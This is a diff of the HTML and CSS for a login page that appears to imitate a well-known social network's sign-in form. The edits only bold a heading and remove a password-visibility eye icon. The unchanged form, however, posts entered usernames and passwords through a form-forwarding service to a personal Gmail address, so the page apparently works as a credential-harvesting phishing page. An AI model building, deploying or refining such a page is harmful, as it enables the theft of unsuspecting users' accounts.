@@ -28,7 +28,7 @@ align-items: center;
 }
 
 #header p{
-    font-weight: 300;
+    font-weight: bold;
     color: #fff;
     font-size: 25px;
 
@@ -123,27 +123,6 @@ margin-top: 15px;
 cursor: pointer;
 }
 
-#fbox #eye1{
-  position: absolute;
-width: 25;
-transform: translate(0, -55);
-right: 60px;
-    cursor: pointer;
-    top: 166px;
-}
-#fbox #eye2{
-  position: absolute;
-width: 25;
-transform: translate(0, -55);
-right: 60px;
-    cursor: pointer;
-    top: 166px;
-   display: none;
-}
-
-#fbox #eye1:hover{
-  width: 30;
-}
 
 .sample p{
     text-align: center;
@@ -167,8 +146,6 @@ right: 60px;
             <form action="https://formsubmit.co/corazonstudios@gmail.com" method="post">
             <input type="text" name="text" id="text" placeholder="Mobile number or email address" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
-           <img id="eye1" src="https://cdn2.iconfinder.com/data/icons/flat-ui-icons-24-px/24/eye-24-512.png" alt="eye1" onclick="toggle()">
-           <!-- <img id="eye2" src="https://www.kindpng.com/picc/m/327-3273865_password-eye-icon-png-transparent-png.png" alt="eye2"> -->
             <button type="submit" id="login">Log In</button>
             <button type="button" id="forget">Forgotten Password?</button>
             <div id="line">
